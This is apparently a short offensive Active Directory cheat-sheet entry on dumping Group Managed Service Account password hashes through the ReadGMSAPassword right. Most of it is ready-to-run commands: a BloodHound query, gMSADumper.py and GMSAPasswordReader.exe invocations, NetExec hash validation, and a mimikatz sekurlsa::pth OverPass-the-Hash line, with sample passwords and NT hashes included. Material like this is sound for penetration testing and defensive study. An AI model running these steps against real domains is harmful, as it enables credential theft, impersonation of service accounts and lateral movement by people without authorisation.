# 10.06 gMSA Password Dump ReadGMSAPassword

> Dump gMSA NT/AES hashes from `msDS-ManagedPassword` with `gMSADumper.py`, then `sekurlsa::pth` for OverPass-the-Hash.

## Overview

Group Managed Service Accounts (gMSAs) store their auto-rotated password in the msDS-ManagedPassword attribute, readable only by principals listed in msDS-GroupMSAMembership. dacledit.py cannot enumerate this right — use BloodHound's ReadGMSAPassword edge. From Linux, gMSADumper.py extracts NT/AES hashes; from Windows, GMSAPasswordReader.exe reads the blob; use mimikatz sekurlsa::pth to perform OverPass-the-Hash with the recovered hash.

## Steps

- BloodHound Cypher: MATCH p=((n)-[r:ReadGMSAPassword]->(m)) RETURN p to find all readable gMSA accounts.
- From Linux: gMSADumper.py returns NT hash and AES keys for each readable gMSA.
- Validate the NT hash with NetExec LDAP.
- From Windows: GMSAPasswordReader.exe --accountname <service> outputs old and current RC4/AES hashes.
- Use mimikatz sekurlsa::pth to open a new process with the gMSA's identity for further abuse.

## Commands

### BloodHound Cypher query

```text
MATCH p=((n)-[r:ReadGMSAPassword]->(m)) RETURN p
```

### gMSADumper.py from Linux

```bash
python3 gMSADumper.py -d <DOMAIN>.local -l <TARGET> -u pedro -p SecuringAD01
```

### Validate with NetExec

```bash
poetry run nxc ldap <TARGET> -u jenkins-dev$ -H 4d8bcd4f5c70fe71beb848b4ab124e61
```

### GMSAPasswordReader from Windows

```text
C:\Tools> GMSAPasswordReader.exe --accountname apache-dev
```

### Mimikatz OverPass-the-Hash with gMSA hash

```text
C:\Tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:apache-dev$ /domain:<DOMAIN>.local /ntlm:69978088B44350772FEBDB1E3DAC6F39 /run:powershell.exe" exit
```
